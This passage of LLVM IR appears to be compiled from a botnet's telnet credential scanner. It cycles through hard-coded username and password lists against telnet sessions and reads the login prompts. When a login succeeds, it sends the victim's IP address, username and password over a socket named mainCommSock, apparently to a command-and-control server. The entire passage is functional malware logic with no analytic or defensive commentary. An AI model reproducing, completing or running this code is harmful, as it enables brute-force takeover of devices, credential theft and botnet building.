  %575 = load i32, i32* %2, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %576
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %577, i32 0, i32 2
  store i8 5, i8* %578, align 8
  br label %584

; <label>:579:                                    ; preds = %558
  %580 = load i32, i32* %2, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %581
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %582, i32 0, i32 2
  store i8 100, i8* %583, align 8
  br label %584

; <label>:584:                                    ; preds = %579, %574
  %585 = load i32, i32* %2, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %586
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %587, i32 0, i32 8
  %589 = load i8*, i8** %588, align 8
  call void @llvm.memset.p0i8.i64(i8* %589, i8 0, i64 1024, i32 1, i1 false)
  br label %1278

; <label>:590:                                    ; preds = %539
  %591 = load i32, i32* %2, align 4
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %592
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %593, i32 0, i32 8
  %595 = load i8*, i8** %594, align 8
  %596 = call i8* @strstr(i8* %595, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %597 = icmp ne i8* %596, null
  br i1 %597, label %598, label %613

; <label>:598:                                    ; preds = %590
  %599 = load i32, i32* %2, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %600
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %601, i32 0, i32 0
  %603 = load i32, i32* %602, align 16
  %604 = call i32 @sclose(i32 %603)
  %605 = load i32, i32* %2, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 2
  store i8 0, i8* %608, align 8
  %609 = load i32, i32* %2, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %610
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %611, i32 0, i32 3
  store i8 0, i8* %612, align 1
  br label %1278

; <label>:613:                                    ; preds = %590
  %614 = load i32, i32* %2, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %615
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %616, i32 0, i32 8
  %618 = load i8*, i8** %617, align 8
  %619 = call i64 @strlen(i8* %618) #10
  %620 = trunc i64 %619 to i16
  %621 = load i32, i32* %2, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %622
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %623, i32 0, i32 7
  store i16 %620, i16* %624, align 16
  br label %625

; <label>:625:                                    ; preds = %613
  %626 = load i32, i32* %2, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 6
  %630 = load i32, i32* %629, align 4
  %631 = add i32 %630, 30
  %632 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %633 = icmp ult i32 %631, %632
  br i1 %633, label %634, label %649

; <label>:634:                                    ; preds = %625
  %635 = load i32, i32* %2, align 4
  %636 = sext i32 %635 to i64
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %636
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %637, i32 0, i32 0
  %639 = load i32, i32* %638, align 16
  %640 = call i32 @sclose(i32 %639)
  %641 = load i32, i32* %2, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %642
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %643, i32 0, i32 2
  store i8 0, i8* %644, align 8
  %645 = load i32, i32* %2, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %646
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %647, i32 0, i32 3
  store i8 1, i8* %648, align 1
  br label %649

; <label>:649:                                    ; preds = %634, %625
  br label %1277

; <label>:650:                                    ; preds = %65
  %651 = load i32, i32* %2, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %652
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %653, i32 0, i32 0
  %655 = load i32, i32* %654, align 16
  %656 = load i32, i32* %2, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 5
  %660 = load i8, i8* %659, align 1
  %661 = zext i8 %660 to i64
  %662 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %661
  %663 = load i8*, i8** %662, align 8
  %664 = load i32, i32* %2, align 4
  %665 = sext i32 %664 to i64
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %665
  %667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %666, i32 0, i32 5
  %668 = load i8, i8* %667, align 1
  %669 = zext i8 %668 to i64
  %670 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %669
  %671 = load i8*, i8** %670, align 8
  %672 = call i64 @strlen(i8* %671) #10
  %673 = call i64 @send(i32 %655, i8* %663, i64 %672, i32 16384)
  %674 = icmp slt i64 %673, 0
  br i1 %674, label %675, label %690

; <label>:675:                                    ; preds = %650
  %676 = load i32, i32* %2, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 0
  %680 = load i32, i32* %679, align 16
  %681 = call i32 @sclose(i32 %680)
  %682 = load i32, i32* %2, align 4
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %683
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %684, i32 0, i32 2
  store i8 0, i8* %685, align 8
  %686 = load i32, i32* %2, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %687
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %688, i32 0, i32 3
  store i8 1, i8* %689, align 1
  br label %1278

; <label>:690:                                    ; preds = %650
  %691 = load i32, i32* %2, align 4
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %692
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %693, i32 0, i32 0
  %695 = load i32, i32* %694, align 16
  %696 = call i64 @send(i32 %695, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i32 0, i32 0), i64 2, i32 16384)
  %697 = icmp slt i64 %696, 0
  br i1 %697, label %698, label %713

; <label>:698:                                    ; preds = %690
  %699 = load i32, i32* %2, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 0
  %703 = load i32, i32* %702, align 16
  %704 = call i32 @sclose(i32 %703)
  %705 = load i32, i32* %2, align 4
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %706
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %707, i32 0, i32 2
  store i8 0, i8* %708, align 8
  %709 = load i32, i32* %2, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %710
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %711, i32 0, i32 3
  store i8 1, i8* %712, align 1
  br label %1278

; <label>:713:                                    ; preds = %690
  %714 = load i32, i32* %2, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 2
  store i8 6, i8* %717, align 8
  br label %1277

; <label>:718:                                    ; preds = %65
  %719 = load i32, i32* %2, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 6
  %723 = load i32, i32* %722, align 4
  %724 = icmp eq i32 %723, 0
  br i1 %724, label %725, label %731

; <label>:725:                                    ; preds = %718
  %726 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %727 = load i32, i32* %2, align 4
  %728 = sext i32 %727 to i64
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %728
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %729, i32 0, i32 6
  store i32 %726, i32* %730, align 4
  br label %731

; <label>:731:                                    ; preds = %725, %718
  %732 = load i32, i32* %2, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 0
  %736 = load i32, i32* %735, align 16
  %737 = load i32, i32* %2, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %738
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %739, i32 0, i32 8
  %741 = load i8*, i8** %740, align 8
  %742 = load i32, i32* %2, align 4
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %743
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %744, i32 0, i32 7
  %746 = load i16, i16* %745, align 16
  %747 = zext i16 %746 to i32
  %748 = call i32 @readUntil(i32 %736, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %741, i32 1024, i32 %747)
  %749 = icmp ne i32 %748, 0
  br i1 %749, label %750, label %825

; <label>:750:                                    ; preds = %731
  %751 = load i32, i32* %2, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 6
  store i32 0, i32* %754, align 4
  %755 = load i32, i32* %2, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %756
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %757, i32 0, i32 7
  store i16 0, i16* %758, align 16
  %759 = load i32, i32* %2, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 8
  %763 = load i8*, i8** %762, align 8
  %764 = call i8* @strstr(i8* %763, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %765 = icmp ne i8* %764, null
  br i1 %765, label %766, label %786

; <label>:766:                                    ; preds = %750
  %767 = load i32, i32* %2, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 8
  %771 = load i8*, i8** %770, align 8
  call void @llvm.memset.p0i8.i64(i8* %771, i8 0, i64 1024, i32 1, i1 false)
  %772 = load i32, i32* %2, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 0
  %776 = load i32, i32* %775, align 16
  %777 = call i32 @sclose(i32 %776)
  %778 = load i32, i32* %2, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %779
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %780, i32 0, i32 2
  store i8 0, i8* %781, align 8
  %782 = load i32, i32* %2, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 3
  store i8 0, i8* %785, align 1
  br label %1278

; <label>:786:                                    ; preds = %750
  %787 = load i32, i32* %2, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %788
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %789, i32 0, i32 8
  %791 = load i8*, i8** %790, align 8
  %792 = call i32 @matchPrompt(i8* %791)
  %793 = icmp ne i32 %792, 0
  br i1 %793, label %814, label %794

; <label>:794:                                    ; preds = %786
  %795 = load i32, i32* %2, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 8
  %799 = load i8*, i8** %798, align 8
  call void @llvm.memset.p0i8.i64(i8* %799, i8 0, i64 1024, i32 1, i1 false)
  %800 = load i32, i32* %2, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %801
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %802, i32 0, i32 0
  %804 = load i32, i32* %803, align 16
  %805 = call i32 @sclose(i32 %804)
  %806 = load i32, i32* %2, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %807
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %808, i32 0, i32 2
  store i8 0, i8* %809, align 8
  %810 = load i32, i32* %2, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %811
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %812, i32 0, i32 3
  store i8 1, i8* %813, align 1
  br label %1278

; <label>:814:                                    ; preds = %786
  %815 = load i32, i32* %2, align 4
  %816 = sext i32 %815 to i64
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %816
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %817, i32 0, i32 2
  store i8 7, i8* %818, align 8
  br label %819

; <label>:819:                                    ; preds = %814
  %820 = load i32, i32* %2, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 8
  %824 = load i8*, i8** %823, align 8
  call void @llvm.memset.p0i8.i64(i8* %824, i8 0, i64 1024, i32 1, i1 false)
  br label %1278

; <label>:825:                                    ; preds = %731
  %826 = load i32, i32* %2, align 4
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %827
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %828, i32 0, i32 8
  %830 = load i8*, i8** %829, align 8
  %831 = call i64 @strlen(i8* %830) #10
  %832 = trunc i64 %831 to i16
  %833 = load i32, i32* %2, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 7
  store i16 %832, i16* %836, align 16
  br label %837

; <label>:837:                                    ; preds = %825
  %838 = load i32, i32* %2, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 6
  %842 = load i32, i32* %841, align 4
  %843 = add i32 %842, 30
  %844 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %845 = icmp ult i32 %843, %844
  br i1 %845, label %846, label %861

; <label>:846:                                    ; preds = %837
  %847 = load i32, i32* %2, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %848
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %849, i32 0, i32 0
  %851 = load i32, i32* %850, align 16
  %852 = call i32 @sclose(i32 %851)
  %853 = load i32, i32* %2, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 2
  store i8 0, i8* %856, align 8
  %857 = load i32, i32* %2, align 4
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %858
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %859, i32 0, i32 3
  store i8 1, i8* %860, align 1
  br label %861

; <label>:861:                                    ; preds = %846, %837
  br label %1277

; <label>:862:                                    ; preds = %65
  %863 = load i32, i32* %2, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 0
  %867 = load i32, i32* %866, align 16
  %868 = call i64 @send(i32 %867, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i64 4, i32 16384)
  %869 = icmp slt i64 %868, 0
  br i1 %869, label %870, label %885

; <label>:870:                                    ; preds = %862
  %871 = load i32, i32* %2, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 0
  %875 = load i32, i32* %874, align 16
  %876 = call i32 @sclose(i32 %875)
  %877 = load i32, i32* %2, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %878
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %879, i32 0, i32 2
  store i8 0, i8* %880, align 8
  %881 = load i32, i32* %2, align 4
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %882
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %883, i32 0, i32 3
  store i8 1, i8* %884, align 1
  br label %1278

; <label>:885:                                    ; preds = %862
  %886 = load i32, i32* %2, align 4
  %887 = sext i32 %886 to i64
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %887
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %888, i32 0, i32 2
  store i8 8, i8* %889, align 8
  br label %1277

; <label>:890:                                    ; preds = %65
  %891 = load i32, i32* %2, align 4
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %892
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %893, i32 0, i32 0
  %895 = load i32, i32* %894, align 16
  %896 = call i64 @send(i32 %895, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i32 0, i32 0), i64 85, i32 16384)
  %897 = icmp slt i64 %896, 0
  br i1 %897, label %898, label %913

; <label>:898:                                    ; preds = %890
  %899 = load i32, i32* %2, align 4
  %900 = sext i32 %899 to i64
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %900
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %901, i32 0, i32 0
  %903 = load i32, i32* %902, align 16
  %904 = call i32 @sclose(i32 %903)
  %905 = load i32, i32* %2, align 4
  %906 = sext i32 %905 to i64
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %906
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %907, i32 0, i32 2
  store i8 0, i8* %908, align 8
  %909 = load i32, i32* %2, align 4
  %910 = sext i32 %909 to i64
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %910
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %911, i32 0, i32 3
  store i8 1, i8* %912, align 1
  br label %1278

; <label>:913:                                    ; preds = %890
  %914 = load i32, i32* %2, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %915
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %916, i32 0, i32 2
  store i8 9, i8* %917, align 8
  br label %1277

; <label>:918:                                    ; preds = %65
  %919 = load i32, i32* %2, align 4
  %920 = sext i32 %919 to i64
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %920
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %921, i32 0, i32 0
  %923 = load i32, i32* %922, align 16
  %924 = call i64 @send(i32 %923, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i32 0, i32 0), i64 49, i32 16384)
  %925 = icmp slt i64 %924, 0
  br i1 %925, label %926, label %941

; <label>:926:                                    ; preds = %918
  %927 = load i32, i32* %2, align 4
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 0
  %931 = load i32, i32* %930, align 16
  %932 = call i32 @sclose(i32 %931)
  %933 = load i32, i32* %2, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %934
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %935, i32 0, i32 2
  store i8 0, i8* %936, align 8
  %937 = load i32, i32* %2, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %938
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %939, i32 0, i32 3
  store i8 1, i8* %940, align 1
  br label %1278

; <label>:941:                                    ; preds = %918
  %942 = load i32, i32* %2, align 4
  %943 = sext i32 %942 to i64
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %943
  %945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %944, i32 0, i32 2
  store i8 10, i8* %945, align 8
  br label %1277

; <label>:946:                                    ; preds = %65
  %947 = load i32, i32* %2, align 4
  %948 = sext i32 %947 to i64
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %948
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %949, i32 0, i32 6
  %951 = load i32, i32* %950, align 4
  %952 = icmp eq i32 %951, 0
  br i1 %952, label %953, label %959

; <label>:953:                                    ; preds = %946
  %954 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %955 = load i32, i32* %2, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %956
  %958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %957, i32 0, i32 6
  store i32 %954, i32* %958, align 4
  br label %959

; <label>:959:                                    ; preds = %953, %946
  %960 = load i32, i32* %2, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %961
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %962, i32 0, i32 0
  %964 = load i32, i32* %963, align 16
  %965 = load i32, i32* %2, align 4
  %966 = sext i32 %965 to i64
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %966
  %968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %967, i32 0, i32 8
  %969 = load i8*, i8** %968, align 8
  %970 = load i32, i32* %2, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %971
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %972, i32 0, i32 7
  %974 = load i16, i16* %973, align 16
  %975 = zext i16 %974 to i32
  %976 = call i32 @readUntil(i32 %964, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %969, i32 1024, i32 %975)
  %977 = icmp ne i32 %976, 0
  br i1 %977, label %978, label %1041

; <label>:978:                                    ; preds = %959
  %979 = load i32, i32* %2, align 4
  %980 = sext i32 %979 to i64
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %980
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %981, i32 0, i32 6
  store i32 0, i32* %982, align 4
  %983 = load i32, i32* %2, align 4
  %984 = sext i32 %983 to i64
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %984
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %985, i32 0, i32 7
  store i16 0, i16* %986, align 16
  %987 = load i32, i32* %2, align 4
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %988
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %989, i32 0, i32 8
  %991 = load i8*, i8** %990, align 8
  %992 = call i8* @strstr(i8* %991, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i32 0, i32 0)) #10
  %993 = icmp ne i8* %992, null
  br i1 %993, label %994, label %1021

; <label>:994:                                    ; preds = %978
  %995 = load i32, i32* @mainCommSock, align 4
  %996 = load i32, i32* %2, align 4
  %997 = sext i32 %996 to i64
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %997
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %998, i32 0, i32 1
  %1000 = bitcast i32* %999 to %struct.in_addr*
  %1001 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1000, i32 0, i32 0
  %1002 = load i32, i32* %1001, align 4
  %1003 = call i8* @inet_ntoa(i32 %1002) #4
  %1004 = load i32, i32* %2, align 4
  %1005 = sext i32 %1004 to i64
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1005
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1006, i32 0, i32 4
  %1008 = load i8, i8* %1007, align 2
  %1009 = zext i8 %1008 to i64
  %1010 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %1009
  %1011 = load i8*, i8** %1010, align 8
  %1012 = load i32, i32* %2, align 4
  %1013 = sext i32 %1012 to i64
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1013
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1014, i32 0, i32 5
  %1016 = load i8, i8* %1015, align 1
  %1017 = zext i8 %1016 to i64
  %1018 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1017
  %1019 = load i8*, i8** %1018, align 8
  %1020 = call i32 (i32, i8*, ...) @sockprintf(i32 %995, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.35, i32 0, i32 0), i8* %1003, i8* %1011, i8* %1019)
  br label %1021

; <label>:1021:                                   ; preds = %994, %978
  %1022 = load i32, i32* %2, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 8
  %1026 = load i8*, i8** %1025, align 8
  call void @llvm.memset.p0i8.i64(i8* %1026, i8 0, i64 1024, i32 1, i1 false)
  %1027 = load i32, i32* %2, align 4
  %1028 = sext i32 %1027 to i64
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1028
  %1030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1029, i32 0, i32 0
  %1031 = load i32, i32* %1030, align 16
  %1032 = call i32 @sclose(i32 %1031)
  %1033 = load i32, i32* %2, align 4
  %1034 = sext i32 %1033 to i64
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1034
  %1036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1035, i32 0, i32 3
  store i8 1, i8* %1036, align 1
  %1037 = load i32, i32* %2, align 4
  %1038 = sext i32 %1037 to i64
